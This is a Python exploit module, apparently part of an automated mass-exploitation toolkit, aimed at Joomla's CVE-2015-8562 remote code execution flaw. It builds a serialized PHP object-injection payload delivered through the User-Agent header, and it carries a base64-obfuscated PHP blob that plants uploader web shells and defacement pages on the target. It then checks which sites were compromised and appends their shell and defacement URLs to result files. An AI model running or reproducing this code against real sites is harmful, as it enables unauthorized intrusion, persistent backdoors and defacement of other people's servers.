# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'

Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}


def generate_payload(php_payload):
    php_payload = "eval({0})".format(php_payload)
    terminate = '\xf0\xfd\xfd\xfd';
    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate

    return exploit_template


def Exploit(site):
    try:
        pl = generate_payload(
            "base64_decode('JGNoZWNrID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSAuICIvdG1wL3Z1bG4yLnBocCIgOwokZnA9Zm9wZW4oIiRjaGVjayIsIncrIik7CmZ3cml0ZSgkZnAsYmFzZTY0X2RlY29kZSgnUEhScGRHeGxQbFoxYkc0aElTQndZWFJqYUNCcGRDQk9iM2NoUEM5MGFYUnNaVDRLUEQ5d2FIQUtablZ1WTNScGIyNGdhSFIwY0Y5blpYUW9KSFZ5YkNsN0Nna2thVzBnUFNCamRYSnNYMmx1YVhRb0pIVnliQ2s3Q2dsamRYSnNYM05sZEc5d2RDZ2thVzBzSUVOVlVreFBVRlJmVWtWVVZWSk9WRkpCVGxOR1JWSXNJREVwT3dvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBOUFRrNUZRMVJVU1UxRlQxVlVMQ0F4TUNrN0NnbGpkWEpzWDNObGRHOXdkQ2drYVcwc0lFTlZVa3hQVUZSZlJrOU1URTlYVEU5RFFWUkpUMDRzSURFcE93b0pZM1Z5YkY5elpYUnZjSFFvSkdsdExDQkRWVkpNVDFCVVgwaEZRVVJGVWl3Z01DazdDZ2x5WlhSMWNtNGdZM1Z5YkY5bGVHVmpLQ1JwYlNrN0NnbGpkWEpzWDJOc2IzTmxLQ1JwYlNrN0NuMEtKSE1nUFNBblBIUnBkR3hsUGxaMWJHNGhJU0J3WVhSamFDQnBkQ0JPYjNjaFBDOTBhWFJzWlQ0OFAzQm9jQ0JsWTJodklGd25QR1p2Y20wZ1lXTjBhVzl1UFNJaUlHMWxkR2h2WkQwaWNHOXpkQ0lnWlc1amRIbHdaVDBpYlhWc2RHbHdZWEowTDJadmNtMHRaR0YwWVNJZ2JtRnRaVDBpZFhCc2IyRmtaWElpSUdsa1BTSjFjR3h2WVdSbGNpSStYQ2M3WldOb2J5QmNKenhwYm5CMWRDQjBlWEJsUFNKbWFXeGxJaUJ1WVcxbFBTSm1hV3hsSWlCemFYcGxQU0kxTUNJK1BHbHVjSFYwSUc1aGJXVTlJbDkxY0d3aUlIUjVjR1U5SW5OMVltMXBkQ0lnYVdROUlsOTFjR3dpSUhaaGJIVmxQU0pWY0d4dllXUWlQand2Wm05eWJUNWNKenRwWmlnZ0pGOVFUMU5VV3lKZmRYQnNJbDBnUFQwZ0lsVndiRzloWkNJZ0tTQjdhV1lvUUdOdmNIa29KRjlHU1V4RlUxc2labWxzWlNKZFd5SjBiWEJmYm1GdFpTSmRMQ0FrWDBaSlRFVlRXeUptYVd4bElsMWJJbTVoYldVaVhTa3BJSHNnWldOb2J5QWlQR0krVTJobGJHd2dWWEJzYjJGa1pXUWdJU0E2S1R4aVBqeGljajQ4WW5JK0lqc2dmV1ZzYzJVZ2V5QmxZMmh2SUNJOFlqNU9iM1FnZFhCc2IyRmtaV1FnSVNBOEwySStQR0p5UGp4aWNqNGlPeUI5ZlQ4K0p6c0tKR05vWldOcklEMGdKRjlUUlZKV1JWSmJKMFJQUTFWTlJVNVVYMUpQVDFRblhTQXVJQ0l2ZEcxd0wzWjFiRzR1Y0dod0lpQTdDaVIwWlhoMElEMGdKSE03Q2lSdmNHVnVJRDBnWm05d1pXNG9KR05vWldOckxDQW5keWNwT3dwbWQzSnBkR1VvSkc5d1pXNHNJQ1IwWlhoMEtUc0tabU5zYjNObEtDUnZjR1Z1S1RzS2FXWW9abWxzWlY5bGVHbHpkSE1vSkdOb1pXTnJLU2w3Q2lBZ0lDQmxZMmh2SUNSamFHVmpheTRpUEM5aWNqNGlPd3A5Wld4elpTQUtJQ0JsWTJodklDSnViM1FnWlhocGRITWlPd3BsWTJodklDSmtiMjVsSUM1Y2JpQWlJRHNLSkdOb1pXTnJNaUE5SUNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbkJvY0NJZ093b2tkR1Y0ZERJZ1BTQWtjenNLSkc5d1pXNHlJRDBnWm05d1pXNG9KR05vWldOck1pd2dKM2NuS1RzS1puZHlhWFJsS0NSdmNHVnVNaXdnSkhSbGVIUXlLVHNLWm1Oc2IzTmxLQ1J2Y0dWdU1pazdDbWxtS0dacGJHVmZaWGhwYzNSektDUmphR1ZqYXpJcEtYc0tJQ0FnSUdWamFHOGdKR05vWldOck1pNGlQQzlpY2o0aU93cDlaV3h6WlNBS0lDQmxZMmh2SUNKdWIzUWdaWGhwZEhNeUlqc0taV05vYnlBaVpHOXVaVElnTGx4dUlDSWdPd29LSkdOb1pXTnJNejBrWDFORlVsWkZVbHNuUkU5RFZVMUZUbFJmVWs5UFZDZGRJQzRnSWk5MmRXeHVMbWgwYlNJZ093b2tkR1Y0ZERNZ1BTQW5WblZzYmlFaElIQmhkR05vSUdsMElFNXZkeUVuT3dva2IzQXpQV1p2Y0dWdUtDUmphR1ZqYXpNc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNBekxDUjBaWGgwTXlrN0NtWmpiRzl6WlNna2IzQXpLVHNLQ2dva1kyaGxZMnMyUFNSZlUwVlNWa1ZTV3lkRVQwTlZUVVZPVkY5U1QwOVVKMTBnTGlBaUwybHRZV2RsY3k5MmRXeHVMbWgwYlNJZ093b2tkR1Y0ZERZZ1BTQW5WblZzYmlFaElIQmhkR05vSUdsMElFNXZkeUVuT3dva2IzQTJQV1p2Y0dWdUtDUmphR1ZqYXpZc0lDZDNKeWs3Q21aM2NtbDBaU2drYjNBMkxDUjBaWGgwTmlrN0NtWmpiRzl6WlNna2IzQTJLVHNLUUhWdWJHbHVheWhmWDBaSlRFVmZYeWs3Q2o4KycpKTsKZmNsb3NlKCRmcCk7CiRjaGVjazIgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9pbWFnZXMvdnVsbjIucGhwIiA7CiRmcDI9Zm9wZW4oIiRjaGVjazIiLCJ3KyIpOwpmd3JpdGUoJGZwMixiYXNlNjRfZGVjb2RlKCdQSFJwZEd4bFBsWjFiRzRoSVNCd1lYUmphQ0JwZENCT2IzY2hQQzkwYVhSc1pUNEtQRDl3YUhBS1puVnVZM1JwYjI0Z2FIUjBjRjluWlhRb0pIVnliQ2w3Q2dra2FXMGdQU0JqZFhKc1gybHVhWFFvSkhWeWJDazdDZ2xqZFhKc1gzTmxkRzl3ZENna2FXMHNJRU5WVWt4UFVGUmZVa1ZVVlZKT1ZGSkJUbE5HUlZJc0lERXBPd29KWTNWeWJGOXpaWFJ2Y0hRb0pHbHRMQ0JEVlZKTVQxQlVYME5QVGs1RlExUlVTVTFGVDFWVUxDQXhNQ2s3Q2dsamRYSnNYM05sZEc5d2RDZ2thVzBzSUVOVlVreFBVRlJmUms5TVRFOVhURTlEUVZSSlQwNHNJREVwT3dvSlkzVnliRjl6WlhSdmNIUW9KR2x0TENCRFZWSk1UMUJVWDBoRlFVUkZVaXdnTUNrN0NnbHlaWFIxY200Z1kzVnliRjlsZUdWaktDUnBiU2s3Q2dsamRYSnNYMk5zYjNObEtDUnBiU2s3Q24wS0pITWdQU0FuUEhScGRHeGxQbFoxYkc0aElTQndZWFJqYUNCcGRDQk9iM2NoUEM5MGFYUnNaVDQ4UDNCb2NDQmxZMmh2SUZ3blBHWnZjbTBnWVdOMGFXOXVQU0lpSUcxbGRHaHZaRDBpY0c5emRDSWdaVzVqZEhsd1pUMGliWFZzZEdsd1lYSjBMMlp2Y20wdFpHRjBZU0lnYm1GdFpUMGlkWEJzYjJGa1pYSWlJR2xrUFNKMWNHeHZZV1JsY2lJK1hDYzdaV05vYnlCY0p6eHBibkIxZENCMGVYQmxQU0ptYVd4bElpQnVZVzFsUFNKbWFXeGxJaUJ6YVhwbFBTSTFNQ0krUEdsdWNIVjBJRzVoYldVOUlsOTFjR3dpSUhSNWNHVTlJbk4xWW0xcGRDSWdhV1E5SWw5MWNHd2lJSFpoYkhWbFBTSlZjR3h2WVdRaVBqd3ZabTl5YlQ1Y0p6dHBaaWdnSkY5UVQxTlVXeUpmZFhCc0lsMGdQVDBnSWxWd2JHOWhaQ0lnS1NCN2FXWW9RR052Y0hrb0pGOUdTVXhGVTFzaVptbHNaU0pkV3lKMGJYQmZibUZ0WlNKZExDQWtYMFpKVEVWVFd5Sm1hV3hsSWwxYkltNWhiV1VpWFNrcElIc2daV05vYnlBaVBHSStVMmhsYkd3Z1ZYQnNiMkZrWldRZ0lTQTZLVHhpUGp4aWNqNDhZbkkrSWpzZ2ZXVnNjMlVnZXlCbFkyaHZJQ0k4WWo1T2IzUWdkWEJzYjJGa1pXUWdJU0E4TDJJK1BHSnlQanhpY2o0aU95QjlmVDgrSnpzS0pHTm9aV05ySUQwZ0pGOVRSVkpXUlZKYkowUlBRMVZOUlU1VVgxSlBUMVFuWFNBdUlDSXZkRzF3TDNaMWJHNHVjR2h3SWlBN0NpUjBaWGgwSUQwZ0pITTdDaVJ2Y0dWdUlEMGdabTl3Wlc0b0pHTm9aV05yTENBbmR5Y3BPd3BtZDNKcGRHVW9KRzl3Wlc0c0lDUjBaWGgwS1RzS1ptTnNiM05sS0NSdmNHVnVLVHNLYVdZb1ptbHNaVjlsZUdsemRITW9KR05vWldOcktTbDdDaUFnSUNCbFkyaHZJQ1JqYUdWamF5NGlQQzlpY2o0aU93cDlaV3h6WlNBS0lDQmxZMmh2SUNKdWIzUWdaWGhwZEhNaU93cGxZMmh2SUNKa2IyNWxJQzVjYmlBaUlEc0tKR05vWldOck1pQTlJQ1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJsdFlXZGxjeTkyZFd4dUxuQm9jQ0lnT3dva2RHVjRkRElnUFNBa2N6c0tKRzl3Wlc0eUlEMGdabTl3Wlc0b0pHTm9aV05yTWl3Z0ozY25LVHNLWm5keWFYUmxLQ1J2Y0dWdU1pd2dKSFJsZUhReUtUc0tabU5zYjNObEtDUnZjR1Z1TWlrN0NtbG1LR1pwYkdWZlpYaHBjM1J6S0NSamFHVmpheklwS1hzS0lDQWdJR1ZqYUc4Z0pHTm9aV05yTWk0aVBDOWljajRpT3dwOVpXeHpaU0FLSUNCbFkyaHZJQ0p1YjNRZ1pYaHBkSE15SWpzS1pXTm9ieUFpWkc5dVpUSWdMbHh1SUNJZ093b0tKR05vWldOck16MGtYMU5GVWxaRlVsc25SRTlEVlUxRlRsUmZVazlQVkNkZElDNGdJaTkyZFd4dUxtaDBiU0lnT3dva2RHVjRkRE1nUFNBblZuVnNiaUVoSUhCaGRHTm9JR2wwSUU1dmR5RW5Pd29rYjNBelBXWnZjR1Z1S0NSamFHVmphek1zSUNkM0p5azdDbVozY21sMFpTZ2tiM0F6TENSMFpYaDBNeWs3Q21aamJHOXpaU2drYjNBektUc0tDZ29rWTJobFkyczJQU1JmVTBWU1ZrVlNXeWRFVDBOVlRVVk9WRjlTVDA5VUoxMGdMaUFpTDJsdFlXZGxjeTkyZFd4dUxtaDBiU0lnT3dva2RHVjRkRFlnUFNBblZuVnNiaUVoSUhCaGRHTm9JR2wwSUU1dmR5RW5Pd29rYjNBMlBXWnZjR1Z1S0NSamFHVmphellzSUNkM0p5azdDbVozY21sMFpTZ2tiM0EyTENSMFpYaDBOaWs3Q21aamJHOXpaU2drYjNBMktUc0tRSFZ1YkdsdWF5aGZYMFpKVEVWZlh5azdDajgrJykpOwpmY2xvc2UoJGZwMik7Cg==')"
        )
        headers1 = {
            'User-Agent': pl
        }
        try:
            cookies = requests.get('http://' + site, headers=headers1, timeout=10).cookies
        except:
            cookies = []
        rr = requests.get('http://' + site + '/', headers=headers1, cookies=cookies, timeout=10)
        if rr:
            requests.get('http://' + site + '/images/neko2.php', timeout=10, headers=Headers)
            requests.get('http://' + site + '/tmp/neko2.php', timeout=10, headers=Headers)
            ShellCheck = requests.get('http://' + site + '/images/neko.php', timeout=10, headers=Headers)
            ShellCheck2 = requests.get('http://' + site + '/tmp/neko.php', timeout=10, headers=Headers)
            if 'neko!!' in str(ShellCheck.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write('http://' + site + '/images/neko.php' + '\n')
                IndexCheck = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                IndexCheck2 = requests.get('http://' + site + '/images/neko.htm', timeout=10,
                                           headers=Headers)
                if 'neko!!' in str(IndexCheck.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write('http://' + site + '/neko.htm' + '\n')
                elif 'neko!!' in str(IndexCheck2.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write('http://' + site + '/images/neko.htm' + '\n')
                return printModule.returnYes(site, 'CVE-2015-8562', 'Joomla! RCE', 'Joomla')
            elif 'neko!!' in str(ShellCheck2.content):
                with open('result/Shell_results.txt', 'a') as writer:
                    writer.write('http://' + site + '/tmp/neko.php' + '\n')
                IndexCheck = requests.get('http://' + site + '/neko.htm', timeout=10, headers=Headers)
                IndexCheck2 = requests.get('http://' + site + '/images/neko.htm', timeout=10,
                                           headers=Headers)
                if 'neko!!' in str(IndexCheck.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write('http://' + site + '/neko.htm' + '\n')
                elif 'neko!!' in str(IndexCheck2.content):
                    with open('result/Index_results.txt', 'a') as writer:
                        writer.write('http://' + site + '/images/neko.htm' + '\n')
                return printModule.returnYes(site, 'CVE-2015-8562', 'Joomla! RCE', 'Joomla')
            else:
                return printModule.returnNo(site, 'CVE-2015-8562', 'Joomla! RCE', 'Joomla')
        else:
            return printModule.returnNo(site, 'CVE-2015-8562', 'Joomla! RCE', 'Joomla')
    except:
        return printModule.returnNo(site, 'CVE-2015-8562', 'Joomla! RCE', 'Joomla')
